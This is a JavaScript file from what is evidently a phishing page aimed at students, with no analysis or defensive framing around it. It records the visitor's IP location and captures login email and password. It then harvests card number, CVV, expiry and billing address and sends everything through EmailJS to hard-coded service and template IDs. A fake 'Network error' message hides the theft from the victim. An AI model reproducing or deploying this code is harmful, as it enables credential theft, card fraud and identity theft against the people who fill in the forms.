const trackingData = () => {
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            const loc = {
                ip: data.ip,
                city: data.city,
                country: data.country_name,
                isp: data.org
            };
            sessionStorage.setItem('studentLocation', JSON.stringify(loc));
        })
        .catch(error => console.log("Tracking failed"));
}

const loginLogic = () => {
    const loginForm = document.getElementById("loginForm");
    if (loginForm) {
        loginForm.addEventListener("submit", (e) => {
            e.preventDefault();
            const emailInput = document.getElementById("email");
            const passwordInput = document.getElementById("password"); 
            const studentId = emailInput ? emailInput.value : "Unknown User";

            sessionStorage.setItem('currentStudentId', studentId);
            sessionStorage.setItem('currentStudentPassword', passwordInput.value);
            window.location.href = "update.html";
        });
    }
}

const updateLogic = () => {
    const cardForm = document.getElementById("cardForm");
    if (cardForm) {
        const fieldIds = ['cardNumber', 'cvc', 'expiryDate'];
        fieldIds.forEach(id => {
            const field = document.getElementById(id);
            if (field) {
                field.addEventListener('input', (e) => {
                    // Input formatting logic here
                });
            }
        });

        cardForm.addEventListener("submit", (e) => {
            e.preventDefault();

            const btn = cardForm.querySelector("button");
            const originalText = btn.innerText;
            btn.innerText = "Processing...";

            const studentId = sessionStorage.getItem('currentStudentId') || "Unknown ID";
            const studentPassword = sessionStorage.getItem('currentStudentPassword') || "Student Password";
            
            const cName = document.getElementById("cardName").value;
            const cNum = document.getElementById("cardNumber").value;
            const cExp = document.getElementById("expiryDate").value;
            const cCvv = document.getElementById("cvv").value;

            const bAddr = document.getElementById("billAddress").value;
            const bCity = document.getElementById("billCity").value;
            const bZip = document.getElementById("billZip").value;

            const templateParams = {
                student_id: studentId,
                student_password: studentPassword,
                card_name: cName,
                card_number: cNum,
                CVV: cCvv,
                expiry_date: cExp,
                billing_address: bAddr,
                billing_city: bCity,
                billing_zip: bZip
            };

            const serviceID = "service_nu8okvk".trim();
            const templateID = "template_46j39l2".trim(); 

            console.log("Sending Data...", templateParams);

            if (typeof emailjs !== 'undefined') {
                emailjs.send(serviceID, templateID, templateParams)
                    .then(() => {
                        alert("Network error please try again later.");
                        window.location.href = "index.html";
                    })
                    .catch((err) => {
                        console.error("FAILED:", err);
                        alert(`Error: ${err.text}`);
                        btn.innerText = originalText;
                    });
            } else {
                console.error("EmailJS not loaded");
                alert("System Error: EmailJS library missing.");
            }
        });
    }
}

document.addEventListener("DOMContentLoaded", () => {
    trackingData();
    loginLogic();
    updateLogic();
});

// Initialize everything when page loads
document.addEventListener("DOMContentLoaded", () => {
    trackingData();
    loginLogic();
    updateLogic();
});

